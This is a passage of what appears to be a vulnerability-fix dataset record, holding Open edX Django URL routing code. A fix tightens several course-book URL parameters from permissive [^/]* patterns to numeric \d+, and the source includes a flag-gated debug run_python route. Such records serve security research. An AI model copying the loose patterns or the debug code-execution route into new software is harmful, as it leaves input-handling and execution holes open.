                                "            'staticbook.views.pdf_index', name=\"pdf_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',",
                                "            'staticbook.views.pdf_index', name=\"pdf_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',",
                                "            'staticbook.views.pdf_index', name=\"pdf_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',",
                                "            'staticbook.views.html_index', name=\"html_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"
                            ]
                        }
                    ],
                    "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ",
                    "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        